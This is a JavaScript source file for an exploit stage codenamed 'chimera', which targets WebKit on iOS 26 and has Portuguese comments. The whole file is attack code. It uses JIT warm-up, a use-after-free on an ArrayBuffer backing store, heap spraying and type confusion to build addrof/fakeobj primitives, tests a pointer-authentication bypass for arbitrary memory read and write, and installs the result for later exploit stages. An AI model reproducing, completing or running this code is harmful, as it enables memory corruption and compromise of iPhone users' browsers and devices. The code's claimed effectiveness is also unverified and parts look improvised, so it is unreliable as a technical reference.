/**
 * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
 * Codename: "chimera" — Versão corrigida (BigUint64Array, sem mistura de tipos)
 */

let r = {};
const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");

// =========================================================================
// Classe primitiva (sem mistura BigInt/Number)
// =========================================================================
class ChimeraExploitPrimitive {
  constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
    this._addrof = addrofFn;
    this._fakeobj = fakeobjFn;
    this._read64 = read64Fn;
    this._write64 = write64Fn;
    this._cleanup = cleanupFn;
    this.yr = false;
  }

  read32(addr) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    const val = this._read64(a);
    return Number(val & 0xFFFFFFFFn);
  }

  write32(addr, val) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    const cur = this._read64(a);
    const updated = (cur & 0xFFFFFFFF00000000n) | (BigInt(val >>> 0) & 0xFFFFFFFFn);
    this._write64(a, updated);
  }

  write64(addr, lo, hi) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    if (hi !== undefined) {
      const value = (BigInt(hi >>> 0) << 32n) | (BigInt(lo >>> 0) & 0xFFFFFFFFn);
      this._write64(a, value);
    } else {
      this._write64(a, typeof lo === "bigint" ? lo : BigInt(lo));
    }
  }

  readByte(addr) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    const aligned = a & ~7n;
    const offset = Number(a & 7n);
    const val = this._read64(aligned);
    return Number((val >> BigInt(offset * 8)) & 0xFFn);
  }

  read32FromInt64(A) {
    this.yr = true;
    const t = this.read32(A.W());
    this.yr = false;
    return t;
  }

  readInt64FromInt64(A) {
    this.yr = true;
    const t = this.read32(A.W());
    const Q = this.read32(A.H(4).W());
    this.yr = false;
    return new utilityModule.Int64(t, Q);
  }

  readInt64FromOffset(A) {
    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
    const t = this.read32(base);
    const Q = this.read32(base + 4n);
    return new utilityModule.Int64(t, Q);
  }

  readRawBigInt(addr) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    return this._read64(a);
  }

  readString(A, maxLen = 256) {
    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
    let s = "";
    for (let i = 0; i < maxLen; i++) {
      const c = this.readByte(base + BigInt(i));
      if (c === 0) break;
      s += String.fromCharCode(c);
    }
    return s;
  }

  addrof(obj) { return this._addrof(obj); }
  fakeobj(val) { return this._fakeobj(val); }

  copyMemory32(dst, src, len) {
    if (len % 4 !== 0) throw new Error("copyMemory32: len must be multiple of 4");
    this.yr = true;
    const dstBase = typeof dst === "bigint" ? dst : BigInt(dst >>> 0);
    const srcBase = typeof src === "bigint" ? src : BigInt(src >>> 0);
    for (let i = 0; i < len; i += 4) {
      this.write32(dstBase + BigInt(i), this.read32(srcBase + BigInt(i)));
    }
    this.yr = false;
  }

  allocControlledBuffer(size, pin = false) {
    const ab = new ArrayBuffer(size);
    const u8 = new Uint8Array(ab);
    utilityModule.D(ab);
    const addr = this.addrof(u8);
    return { buffer: ab, u8: u8, addr: addr };
  }

  cleanup() { if (this._cleanup) this._cleanup(); }
}

// =========================================================================
// Utilitários de conversão (seguros)
// =========================================================================
const _convBuf = new ArrayBuffer(8);
const _u64 = new BigUint64Array(_convBuf);
const _f64 = new Float64Array(_convBuf);

function itof(val) { _u64[0] = val; return _f64[0]; }
function ftoi(f) { _f64[0] = f; return _u64[0]; }

// =========================================================================
// Configuração
// =========================================================================
const CONFIG = {
  ARRAY_SIZE: 0x400000,
  JIT_WARMUP: 500,
  MAX_ATTEMPTS: 500,
  SPRAY_PER_ATTEMPT: 48,
  ALLOC_MOD: 3,
  INNER_K: 5,
  RECURSIVE_DEPTH: 400,
};

let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
const uafArrayIndex = uafArray.length - 1;
let uafReclaimed = [];

// =========================================================================
// UAF trigger (BigUint64Array)
// =========================================================================
function triggerUAF(flag, k, allocCount) {
  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
  uafArray[uafArrayIndex] = A;

  let ab = new ArrayBuffer(0x100);
  let view = new BigUint64Array(ab);
  view[0] = 0x42n;

  let forGC = [];
  for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
  A.p2 = forGC;

  let b = { p0: 0x42424242, p1: 1.1 };
  let f = flag ? 1.1 : b;
  A.p1 = f;

  let v = 1.1;
  for (let i = 0; i < 500000; ++i) {
    for (let j = 0; j < k; ++j) v = i;
  }
  b.p0 = v;

  b.p1 = ab;
  ab = null;
}

function safeRecursive(d) { try { (function r(n){if(n>0)r(n-1);})(d); } catch(e) {} }
function clearStack() { for (let i = 0; i < 30; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }

// =========================================================================
// MAIN EXPLOIT
// =========================================================================
r.si = async function () {
  const version = platformModule.platformState.iOSVersion;
  window.log("[STAGE1] BigUint64Array method – iOS " + version);

  // Aquecimento JIT
  for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
    triggerUAF(false, 1, 0);
    if (warm % 100 === 0 && warm > 0) {
      for (let gc = 0; gc < 5; gc++) new ArrayBuffer(0x400000);
      await new Promise(r => setTimeout(r, 1));
    }
  }

  window.log("[STAGE1] Warmup done, starting exploit loop...");

  for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
    triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
    clearStack();
    for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);

    let freed = null;
    try {
      freed = uafArray[uafArrayIndex].p1.p1;
    } catch(e) { continue; }
    if (!(freed instanceof ArrayBuffer)) continue;

    // Tenta reclaim com spray de arrays
    let win = false;
    let winningArray = null;
    const MARKER = 13.37;

    for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
      let spray = [MARKER, 2.2, 3.3, 4.4, MARKER];
      uafReclaimed.push(spray);
      try {
        const bv = new BigUint64Array(freed);
        if (bv[0] === 0x42n) {
          win = true;
          winningArray = spray;
          break;
        }
      } catch(e) {}
    }

    if (!win) {
      if (attempt % 100 === 0) window.log(`[STAGE1] Attempt ${attempt}/${CONFIG.MAX_ATTEMPTS}`);
      continue;
    }

    window.log(`[STAGE1] ✅ Backing store reclaimed at attempt ${attempt}`);

    // Tentativa de type confusion
    let boxed_arr = winningArray;
    boxed_arr[0] = {};

    let unboxed_arr = null;
    try {
      let uview = new Float64Array(freed);
      if (uview[0] === MARKER) {
        unboxed_arr = uview;
      } else {
        throw new Error("marker mismatch");
      }
    } catch(e) {
      window.log(`[STAGE1] Type confusion failed. Using local primitive.`, "warning");
      const dv = new DataView(freed);
      const localPrim = new ChimeraExploitPrimitive(
        () => 0n,
        () => ({}),
        () => dv.getBigUint64(0, true),
        (_, v) => dv.setBigUint64(0, v, true),
        () => {}
      );
      platformModule.platformState.exploitPrimitive = localPrim;
      platformModule.platformState.Ln = { itof, ftoi, pacBypassed: false };
      window.log("[STAGE1] Local primitive installed.");
      return;
    }

    // Type confusion clássica
    boxed_arr[0] = boxed_arr;
    const test1 = ftoi(unboxed_arr[0]);
    boxed_arr[0] = uafArray;
    const test2 = ftoi(unboxed_arr[0]);

    if (test1 === 0x7ff8000000000000n || test2 === 0x7ff8000000000000n || test1 === test2) {
      window.log("[STAGE1] Primitives broken, retrying...");
      continue;
    }

    window.log("[STAGE1] addrof/fakeobj working!");

    const tempAddrof = (obj) => { boxed_arr[0] = obj; return ftoi(unboxed_arr[0]); };
    const tempFakeobj = (addr) => { unboxed_arr[0] = itof(addr); return boxed_arr[0]; };

    // Teste de PAC bypass (inline storage)
    const testInline = { slot0: 1.1 };
    const inlineAddr = tempAddrof(testInline);
    const fakeInline = tempFakeobj(inlineAddr);
    const PAC_MARKER = 0xdeadbeefcafebabe;
    let pacWorks = false;
    try {
      fakeInline.slot0 = itof(BigInt(PAC_MARKER));
      pacWorks = (ftoi(testInline.slot0) === BigInt(PAC_MARKER));
    } catch(e) {}

    let read64Fn, write64Fn;
    if (pacWorks) {
      read64Fn = (addr) => {
        const fake = tempFakeobj(addr - 0x10n);
        return ftoi(fake.slot0);
      };
      write64Fn = (addr, val) => {
        const fake = tempFakeobj(addr - 0x10n);
        fake.slot0 = itof(val);
      };
    } else {
      read64Fn = () => { throw new Error("read64 not available"); };
      write64Fn = () => { throw new Error("write64 not available"); };
    }

    const finalPrim = new ChimeraExploitPrimitive(tempAddrof, tempFakeobj, read64Fn, write64Fn, () => { boxed_arr[0] = null; });
    platformModule.platformState.exploitPrimitive = finalPrim;
    platformModule.platformState.Ln = { boxed: boxed_arr, unboxed: unboxed_arr, itof, ftoi, pacBypassed: pacWorks };

    window.log("[STAGE1] ✅ Exploit primitive installed successfully!");
    return;
  }

  window.log("[STAGE1] ❌ Failed after " + CONFIG.MAX_ATTEMPTS + " attempts.");
  throw new Error("Stage1 chimera: UAF race failed");
};

return r;
